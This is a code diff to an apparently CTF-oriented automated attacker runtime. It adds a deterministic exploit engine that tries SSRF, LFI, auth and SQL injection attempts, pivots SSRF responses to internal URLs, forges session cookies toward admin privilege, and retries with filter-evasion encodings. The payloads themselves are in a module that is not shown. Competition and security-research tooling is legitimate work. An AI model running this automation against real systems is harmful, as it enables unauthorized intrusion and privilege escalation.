@@ -14,13 +14,30 @@ from concurrent.futures import ThreadPoolExecutor
 from .audit import AuditLogger, Redactor
 from .config import AttackerConfig
 from .egress import EgressError, EgressGateway, build_allowlists
+from .exploits import (
+    Attempt,
+    auth_tamper_attempts,
+    build_attempts,
+    extract_internal_urls,
+    ssrf_pivot_attempts,
+    tamper_token,
+)
 from .flags import FlagPipeline, SubmitClient
 from .llm_advisor import LLMAdvisor, escalated_model
-from .models import Capability, ExecutionPlan, Outcome, RoundBudget, SideEffectClass, SubmitState
+from .models import (
+    Capability,
+    ExecutionPlan,
+    Outcome,
+    RoundBudget,
+    SideEffectClass,
+    SubmitState,
+    VulnClass,
+)
 from .observation import EvidenceFactory, Observer, UrllibHttp
 from .phase_policy import FairScheduler
 from .planner import EndpointState, Planner
 from .playbook import Playbook
+from .profiles import suggest_vuln_classes
 from .rate_limit import RateLimiter
 from .recon import COMMON_PROBE_PATHS
 from .round_report import RoundReport
@@ -214,6 +231,104 @@ class AttackerRuntime:
         self._report.record_request()
         return result, self._process_flags(result.body)
 
+    # ---- 결정론적 exploit 엔진 (LLM 전, 토큰 0) ----
+
+    def _execute_attempt(self, endpoint, attempt: Attempt, evidence_ref):
+        """단일 결정론 시도를 READ_ONLY 계획으로 실행한다. (result, captured) 반환.
+
+        무응답(필터 DROP)이면 경로 재인코딩 evasion 변형으로 재시도한다.
+        """
+        now = self.clock()
+        plan = ExecutionPlan(
+            tool="http", target=endpoint,
+            args={"method": attempt.method, "path": attempt.path,
+                  "headers": dict(attempt.headers), "body": attempt.body or ""},
+            plan_id=f"exp-{self._round_id}-{endpoint.endpoint_id}-{now}",
+            round_id=self._round_id, endpoint_id=endpoint.endpoint_id,
+            capability=Capability.ATTACK_TARGET,
+            evidence_refs=[evidence_ref] if evidence_ref else [],
+            created_at_monotonic=now, expires_at_monotonic=now + PLAN_TTL,
+            side_effect_class=SideEffectClass.READ_ONLY,
+            reason="det:" + attempt.reason)
+        try:
+            result = self._adapter.execute(plan)
+        except (PlanBindingError, EgressError):
+            return None, False
+        self._report.record_request()
+        if self._process_flags(result.body):
+            return result, True
+        if result.outcome == Outcome.TIMEOUT:
+            evaded, captured = self._try_evasion(plan, result.observation.evidence_ref)
+            if captured:
+                return evaded, True
+            if evaded is not None:
+                return evaded, False
+        return result, False
+
+    @staticmethod
+    def _cookie_from_headers(headers) -> tuple:
+        """Set-Cookie 헤더에서 (name, value)를 뽑는다. 없으면 (None, None)."""
+        for key, val in (headers or {}).items():
+            if key.lower() == "set-cookie" and "=" in val:
+                pair = val.split(";", 1)[0].strip()
+                name, _, value = pair.partition("=")
+                if name and value:
+                    return name.strip(), value.strip()
+        return None, None
+
+    def _deterministic_exploit(self, endpoint, banner, banner_fp,
+                               banner_headers, evidence_ref) -> bool:
+        """배너 힌트로 4개 취약 부류(SSRF·LFI·AUTH·SQLI)를 토큰 0으로 시도한다.
+
+        SSRF는 1단 응답의 내부 URL을 2단으로 피벗하고, AUTH는 노출된 세션 토큰을 변조해
+        재전송한다. 성공 형태는 playbook에 기록해 같은 배너의 다른 표적에 재사용한다.
+        """
+        hints = suggest_vuln_classes(banner)
+        attempts = build_attempts(banner, hints, endpoint.port)
+        ssrf_bodies = []           # (base_path, param, body) — 2단 피벗용
+        cookie_name, cookie_val = self._cookie_from_headers(banner_headers)
+
+        def run(attempt) -> bool:
+            nonlocal evidence_ref, cookie_name, cookie_val
+            result, captured = self._execute_attempt(endpoint, attempt, evidence_ref)
+            if captured:
+                self._playbook.record(banner_fp,
+                                      {"method": attempt.method, "path": attempt.path})
+                self.audit.log("hit", target=endpoint.key(), path=attempt.path,
+                               vuln=attempt.vuln.value, reason="det:" + attempt.reason)
+                return True
+            if result is None:
+                return False
+            evidence_ref = result.observation.evidence_ref
+            if attempt.vuln == VulnClass.SSRF and "?" in attempt.path:
+                base, _, query = attempt.path.partition("?")
+                param = query.split("=", 1)[0]
+                ssrf_bodies.append((base, param, result.body))
+            if cookie_name is None:
+                cn, cv = self._cookie_from_headers(result.observation.redacted_header_hints)
+                if cn:
+                    cookie_name, cookie_val = cn, cv
+            return False
+
+        for attempt in attempts:
+            if run(attempt):
+                return True
+
+        # SSRF 2단 피벗 — 1단이 흘린 내부 URL(평문·base64)을 다시 프록시한다
+        for base, param, body in ssrf_bodies:
+            urls = extract_internal_urls(body)
+            for pivot in ssrf_pivot_attempts(base, param, urls):
+                if run(pivot):
+                    return True
+
+        # AUTH 세션 변조 — 노출된 토큰을 관리자 권한으로 올려 재전송한다
+        if cookie_name and cookie_val:
+            tokens = tamper_token(cookie_val)
+            for attempt in auth_tamper_attempts(cookie_name, tokens):
+                if run(attempt):
+                    return True
+        return False
+
     # ---- 단일 표적 공격 ----
 
     def attack_endpoint(self, endpoint) -> bool:
@@ -245,6 +360,11 @@ class AttackerRuntime:
                 return True
             if result is not None:
                 current_evidence = result.observation.evidence_ref
+
+        # 결정론적 exploit 엔진 — 알려진 4개 부류 체인을 LLM 토큰 0으로 시도(LLM 전)
+        if self._deterministic_exploit(endpoint, banner, banner_fp,
+                                       resp.headers, current_evidence):
+            return True
 
         state = EndpointState(endpoint)
         feedback = ""
